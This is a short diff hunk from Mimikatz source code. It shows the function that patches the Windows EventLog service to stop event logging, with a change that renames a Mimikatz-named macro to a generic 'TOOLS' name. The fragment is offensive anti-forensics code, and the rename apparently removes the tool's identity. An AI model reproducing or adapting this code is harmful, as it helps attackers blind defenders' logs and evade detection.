@@ -76,7 +76,7 @@ KULL_M_PATCH_GENERIC EventReferences[] = {
 
 NTSTATUS kuhl_m_event_drop(int argc, wchar_t * argv[])
 {
-	kull_m_patch_genericProcessOrServiceFromBuild(EventReferences, ARRAYSIZE(EventReferences), L"EventLog", (MIMIKATZ_NT_MAJOR_VERSION < 6) ? L"eventlog.dll" : L"wevtsvc.dll", TRUE);
+	kull_m_patch_genericProcessOrServiceFromBuild(EventReferences, ARRAYSIZE(EventReferences), L"EventLog", (TOOLS_NT_MAJOR_VERSION < 6) ? L"eventlog.dll" : L"wevtsvc.dll", TRUE);
 	return STATUS_SUCCESS;
 }
 
